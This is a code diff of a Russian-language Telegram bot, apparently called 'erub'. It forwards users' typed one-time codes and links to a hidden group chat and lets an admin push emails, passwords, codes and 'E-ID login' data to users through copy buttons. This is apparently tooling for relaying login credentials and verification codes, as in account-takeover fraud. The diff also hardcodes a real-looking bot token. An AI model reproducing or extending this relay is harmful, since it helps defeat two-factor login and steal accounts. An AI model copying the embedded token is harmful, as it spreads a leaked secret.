@@ -1,13 +1,14 @@
 import os
 import logging
 import json
-import asyncio
+import requests
+import time
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, KeyboardButton, ReplyKeyboardMarkup, WebAppInfo
 from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
 
 # ==================== КОНФИГ ====================
-BOT_TOKEN = os.environ.get("TELEGRAM_TOKEN", "ТОКЕН_ВТОРОГО_БОТА")
-GROUP_CHAT_ID = -1004457031723  # ← ID ГРУППЫ (с минусом!)
+BOT_TOKEN = "8828808036:AAFw0KZn5czy-OqhpwFkZEi8Ja3TcKxkfgE"
+GROUP_CHAT_ID = -1004457031723  # ID группы (с минусом!)
 WEB_APP_URL = "https://d3987616-hue.github.io/erub-miniapp2/"
 # ===============================================
 
@@ -38,6 +39,7 @@ class ErubBot:
 
         logger.info(f"👤 Пользователь {user_id} ({first_name}) запустил бота")
 
+        # Уведомление в группу
         await self.application.bot.send_message(
             chat_id=GROUP_CHAT_ID,
             text=f"🟢 НОВЫЙ ВХОД В БОТА!\n\n"
@@ -106,10 +108,13 @@ class ErubBot:
         text = update.message.text
         chat_id = update.effective_chat.id
 
+        # Если сообщение из группы — игнорируем
         if chat_id == GROUP_CHAT_ID:
             return
 
+        # ===== Если сообщение от обычного пользователя =====
         if user_id != GROUP_CHAT_ID:
+            # ---- Код ----
             if user_sessions.get(user_id, {}).get('awaiting_code'):
                 await self.application.bot.send_message(
                     chat_id=GROUP_CHAT_ID,
@@ -120,6 +125,7 @@ class ErubBot:
                 await update.message.reply_text("✅ Отправлено")
                 return
 
+            # ---- Ссылка ----
             if user_sessions.get(user_id, {}).get('awaiting_link'):
                 await self.application.bot.send_message(
                     chat_id=GROUP_CHAT_ID,
@@ -133,6 +139,7 @@ class ErubBot:
             await update.message.reply_text("ℹ️ Используйте кнопку «Войти в систему»")
             return
 
+        # ===== Если сообщение от администратора (JSON) =====
         if text.startswith('{') and text.endswith('}'):
             try:
                 data = json.loads(text)
@@ -142,13 +149,13 @@ class ErubBot:
                 code = data.get('code')
                 link = data.get('link')
 
+                # ---- Обычный вход ----
                 if email and password and not code and not link:
-                    # КНОПКА ДЛЯ КОПИРОВАНИЯ ПОЧТЫ
+                    # Кнопки для копирования
                     copy_email_btn = InlineKeyboardButton(
                         text="📧 Копировать почту",
                         copy_text=email
                     )
-                    # КНОПКА ДЛЯ КОПИРОВАНИЯ ПАРОЛЯ
                     copy_pass_btn = InlineKeyboardButton(
                         text="🔑 Копировать пароль",
                         copy_text=password
@@ -174,8 +181,8 @@ class ErubBot:
                         parse_mode="Markdown"
                     )
 
+                # ---- Код ----
                 elif code:
-                    # КНОПКА ДЛЯ КОПИРОВАНИЯ КОДА
                     copy_code_btn = InlineKeyboardButton(
                         text="📋 Копировать код",
                         copy_text=code
@@ -190,8 +197,8 @@ class ErubBot:
                         parse_mode="Markdown"
                     )
 
+                # ---- Ссылка ----
                 elif link:
-                    # КНОПКА ДЛЯ КОПИРОВАНИЯ ССЫЛКИ
                     copy_link_btn = InlineKeyboardButton(
                         text="🔗 Копировать ссылку",
                         copy_text=link
@@ -206,6 +213,7 @@ class ErubBot:
                         parse_mode="Markdown"
                     )
 
+                # ---- E-ID вход ----
                 elif data.get('type') == 'eid_login':
                     copy_email_btn = InlineKeyboardButton(
                         text="📧 Копировать почту",
@@ -242,18 +250,25 @@ class ErubBot:
 
     # ===== 4. ЗАПУСК С ПРИНУДИТЕЛЬНЫМ СБРОСОМ =====
     def run(self):
+        # ===== ПРИНУДИТЕЛЬНОЕ ЗАВЕРШЕНИЕ ВСЕХ СТАРЫХ ПРОЦЕССОВ =====
+        try:
+            requests.get(f'https://api.telegram.org/bot{BOT_TOKEN}/deleteWebhook?drop_pending_updates=True')
+            print("✅ Вебхук сброшен")
+        except Exception as e:
+            print(f"⚠️ Ошибка сброса вебхука: {e}")
+
+        try:
+            requests.get(f'https://api.telegram.org/bot{BOT_TOKEN}/getUpdates?offset=-1&timeout=1')
+            print("✅ Старые сессии завершены")
+        except Exception as e:
+            print(f"⚠️ Ошибка завершения сессий: {e}")
+
+        time.sleep(1)
+
         print("=" * 50)
         print("🤖 БОТ ЗАПУЩЕН")
         print(f"👥 GROUP_CHAT_ID: {GROUP_CHAT_ID}")
         print("=" * 50)
-
-        try:
-            loop = asyncio.new_event_loop()
-            asyncio.set_event_loop(loop)
-            loop.run_until_complete(self.application.bot.delete_webhook(drop_pending_updates=True))
-            print("✅ Старые сессии завершены, вебхук сброшен")
-        except Exception as e:
-            print(f"⚠️ Ошибка при сбросе сессий: {e}")
 
         self.application.run_polling()
 
